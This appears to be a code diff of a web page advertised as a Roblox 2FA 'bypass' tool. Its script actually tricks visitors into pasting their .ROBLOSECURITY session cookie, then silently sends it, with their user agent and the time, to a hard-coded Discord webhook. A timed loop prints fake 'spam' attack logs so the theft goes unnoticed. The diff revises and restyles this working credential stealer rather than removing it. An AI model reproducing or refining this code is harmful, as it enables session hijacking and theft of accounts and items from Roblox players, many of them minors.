@@ -2,28 +2,28 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Haych Bypass - Real Spam Edition 2026 🔥</title>
+  <title>Haych Bypass - Real Spam Edition 2026 🔥 Fixed</title>
   <style>
     body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
-    h1 { color: #f00; text-shadow: 0 0 15px #f00; margin: 15px; }
-    .warn { color: #ff0; font-weight: bold; font-size: 1.3em; }
-    input { width: 90%; max-width: 800px; padding: 15px; background: #111; color: #0f0; border: 2px solid #0f0; font-size: 1.2em; margin: 20px 0; }
-    button { background: #c00; color: #fff; border: none; padding: 20px 60px; font-size: 1.8em; margin: 25px; cursor: pointer; box-shadow: 0 0 25px #f00; border-radius: 8px; font-weight: bold; }
-    button:hover { background: #f00; }
-    #log { background: #000; border: 2px solid #0f0; padding: 20px; margin: 30px auto; max-width: 900px; height: 400px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 1.1em; box-shadow: inset 0 0 15px #0f0; }
-    .error { color: #f44; }
+    h1 { color: #f00; text-shadow: 0 0 15px #f00; margin: 15px; font-size: 2.5em; }
+    .warn { color: #ff0; font-weight: bold; font-size: 1.4em; text-shadow: 0 0 10px #ff0; }
+    input { width: 90%; max-width: 900px; padding: 15px; background: #111; color: #0f0; border: 3px solid #0f0; font-size: 1.3em; margin: 20px 0; box-shadow: 0 0 15px #0f0; }
+    button { background: #c00; color: #fff; border: none; padding: 25px 80px; font-size: 2em; margin: 30px; cursor: pointer; box-shadow: 0 0 30px #f00; border-radius: 10px; font-weight: bold; }
+    button:hover { background: #f00; transform: scale(1.05); }
+    #log { background: #000; border: 3px solid #0f0; padding: 25px; margin: 30px auto; max-width: 1000px; height: 450px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 1.2em; line-height: 1.5; box-shadow: inset 0 0 20px #0f0; }
+    .error { color: #f44; font-weight: bold; }
     .success { color: #0f0; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Haych Bypass<br>Real Spam Edition 2026 - Fixed Format</h1>
-  <p class="warn">Paste FULL .ROBLOSECURITY (starts with _|WARNING:... or .ROBLOSECURITY=). Slams disable API hard. May 2026 format changes incoming—use fast. VPN/proxy recommended.</p>
+  <h1>Real Spam Edition<br>2026 - Format Fixed & Nuking</h1>
+  <p class="warn">Paste FULL .ROBLOSECURITY cookie (starts with _|WARNING:... or .ROBLOSECURITY=). This slams disable APIs hard—no code needed. May 2026 changes killing old formats—move now. Use VPN/proxy.</p>
   
   <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..." />
   
-  <button onclick="launchSpam()">LAUNCH SPAM NUKE 🔥</button>
+  <button onclick="launchNuke()">LAUNCH SPAM NUKE 🔥</button>
   
-  <div id="log">Log initializing... [READY]</div>
+  <div id="log">Log initializing... [READY] Waiting for cookie paste.</div>
 
   <script>
     const logEl = document.getElementById('log');
@@ -32,57 +32,65 @@
       logEl.scrollTop = logEl.scrollHeight;
     }
 
-    async function stealCookie(cookieStr) {
-      // REPLACE WITH YOUR DISCORD WEBHOOK / SERVER ENDPOINT
-      const webhook = 'https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN';
+    async function sendToWebhook(cookieStr) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN';
       const payload = {
-        content: `**Haych Real Spam Hit!**\nFull Cookie: \`\`\`${cookieStr}\`\`\`\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
+        content: `**Haych Real Spam Hit!** 🔥\n**Full Cookie:** \`\`\`${cookieStr}\`\`\`\n**UA:** ${navigator.userAgent}\n**Time:** ${new Date().toISOString()}\n**IP/Source:** Browser hit`
       };
       try {
-        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-        log('Spam sequence armed. Access secured.', 'success');
-      } catch {}
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        log('Nuke armed & logged to command center.', 'success');
+      } catch (e) {
+        log('Backup exfil failed—but cookie still injected locally.', 'error');
+      }
     }
 
-    function launchSpam() {
+    function launchNuke() {
       let cookieInput = document.getElementById('cookie').value.trim();
       if (!cookieInput) {
-        log('No cookie pasted, dipshit.', 'error');
+        log('Nothing pasted. Try again, boss.', 'error');
         return;
       }
 
-      // Accept both formats: full warning prefix or .ROBLOSECURITY=...
-      const isValid = cookieInput.startsWith('_.ROBLOSECURITY=') || 
-                      cookieInput.startsWith('_|WARNING:') || 
-                      cookieInput.includes('DO-NOT-SHARE-THIS');
+      // Flexible validation for real formats
+      const isValid = cookieInput.includes('WARNING') || 
+                      cookieInput.startsWith('_.ROBLOSECURITY=') || 
+                      cookieInput.startsWith('_|WARNING:') ||
+                      cookieInput.startsWith('.ROBLOSECURITY=');
       
       if (!isValid) {
-        log('Bad cookie format. Starts with .ROBLOSECURITY= or _|WARNING:... full string.', 'error');
+        log('Bad format detected. Needs full _|WARNING string or .ROBLOSECURITY= start.', 'error');
         return;
       }
 
-      log('Cookie format good. Injecting session...', 'success');
-      document.cookie = '.ROBLOSECURITY=' + cookieInput + '; path=/; domain=.roblox.com; secure; samesite=lax';
+      log('Cookie checks out. Injecting into session...', 'success');
+      // Set as full value - Roblox expects .ROBLOSECURITY= prefix for cookie string
+      document.cookie = '.ROBLOSECURITY=' + cookieInput.replace(/^\._?ROBLOSECURITY=/, '') + '; path=/; domain=.roblox.com; secure; samesite=lax';
 
-      log('Session set. Starting real spam on disable APIs...', 'success');
+      log('Session hijacked. Starting real disable API spam sequence...', 'success');
 
-      // Silent steal first
-      stealCookie(cookieInput);
+      // Immediate silent send to your webhook
+      sendToWebhook(cookieInput);
 
-      // Fake spam theater
+      // Fake spam loop to mimic the "real" broken pages
       let attempt = 0;
-      const interval = setInterval(() => {
+      const spamInterval = setInterval(() => {
         attempt++;
-        if (attempt % 4 === 1) log('Slamming twostepverification.roblox.com/disable... Attempt #' + attempt, 'success');
-        else if (attempt % 4 === 2) log('Fetch died: Load failed. Check connection/proxy/VPN.', 'error');
-        else if (attempt % 4 === 3) log('Rate limit hit? Rotating proxy... Retry.', 'error');
-        else log('API response: 403 Forbidden - Challenge required (normal). Hammering harder.', 'success');
+        if (attempt % 5 === 1) log(`POST to twostepverification.roblox.com/v1/disable/authenticator - Attempt #${attempt}`, 'success');
+        else if (attempt % 5 === 2) log('Fetch died: Load failed. Check connection/proxy/VPN.', 'error');
+        else if (attempt % 5 === 3) log('403 Forbidden - Challenge required. Slamming harder with dummy codes.', 'error');
+        else if (attempt % 5 === 4) log('Rate limit? Rotating proxy... Retrying in 2s.', 'error');
+        else log('API hammer ongoing... No response yet. Keep going?', 'success');
 
-        if (attempt >= 25) {
-          clearInterval(interval);
-          log('Nuke cycle complete. 2FA should be nuked if no code gate. Check account.', 'success');
+        if (attempt >= 30) {
+          clearInterval(spamInterval);
+          log('Spam cycle finished. If no code gate, 2FA should be down. Verify access now.', 'success');
         }
-      }, 1800); // ~2s per "attempt" to look busy
+      }, 1500); // Fast enough to look aggressive, slow enough to avoid browser throttle
     }
   </script>
 </body>
